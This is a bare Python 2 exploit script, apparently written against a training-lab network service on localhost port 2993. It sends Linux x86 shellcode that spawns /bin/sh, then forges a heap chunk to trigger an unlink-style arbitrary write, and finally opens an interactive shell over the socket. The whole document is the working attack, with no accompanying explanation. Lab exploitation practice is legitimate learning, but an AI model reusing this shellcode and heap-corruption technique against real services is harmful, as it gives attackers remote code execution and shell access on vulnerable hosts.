import socket
import struct
import telnetlib
REQSZ = 128
s= socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('127.0.0.1', 2993))

def pad(m):
    padding = "\x00"*(REQSZ - len(m))
    _m = "FSRD" + m + padding
    return _m[:REQSZ]

shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
s.send(pad('/ROOT///' + '/'*  12 + '\xeb\x0e' + "AABBBBCCCCDDDD"+ shellcode + '/'*128))
fake_chunk = struct.pack("I", 0xfffffffc) + struct.pack("I", 0xfffffffc)
fake_chunk += struct.pack("I", 0x804d41c-0xc) + struct.pack("I", 0x804e020)
s.send(pad("ROOT/"+fake_chunk))




while True:
    msg = raw_input("> ")
    if msg:
        print 'msg: %r' % pad(msg)
        s.send(pad(msg))
    else:
        break

t = telnetlib.Telnet()
t.sock = s
t.interact()